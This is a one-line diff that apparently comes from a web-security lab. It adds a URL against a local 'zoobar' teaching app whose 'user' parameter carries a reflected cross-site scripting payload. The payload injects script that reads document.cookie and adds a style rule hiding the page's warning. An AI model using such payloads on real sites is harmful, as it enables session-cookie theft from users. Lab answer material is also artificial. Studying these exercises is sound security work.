@@ -1,0 +1,1 @@
+localhost:8080/zoobar/index.cgi/users?user=%22style+size=10%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cstyle%3E.warning%7Bdisplay%3Anone%7D%3C/style%3E%3C/
